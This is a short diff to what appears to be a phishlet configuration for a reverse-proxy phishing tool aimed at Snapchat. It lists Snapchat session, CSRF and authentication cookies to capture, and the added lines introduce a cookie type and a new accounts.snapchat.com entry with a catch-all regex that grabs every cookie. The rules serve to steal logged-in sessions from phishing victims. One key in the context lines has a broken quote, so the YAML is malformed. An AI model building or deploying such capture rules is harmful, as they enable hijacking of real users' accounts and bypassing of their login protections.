@@ -47,6 +47,10 @@ proxy_hosts:
 auth_tokens:
   - domain: '.snapchat.com'
     keys: ['sc-a-nonce', web_client_id', 'sc-cookies-accepted', 'sc-a-csrf', 'sc-a-session', 'xsrf_token', '_sc-sid', 'sc-wcid', '_scid', '_scid_r', '__Host-sc-authn-session-payload', '__Host-X-Snap-Client-Cookie', '__Host-sc-a-nonce', '__Host-sc-a-auth-session', '.*,regexp']
+    type: 'cookie'
+  - domain: 'accounts.snapchat.com'
+    keys: ['xsrf_token', '_sc-sid', 'sc-wcid', '.*,regexp']
+    type: 'cookie'
    
 
 
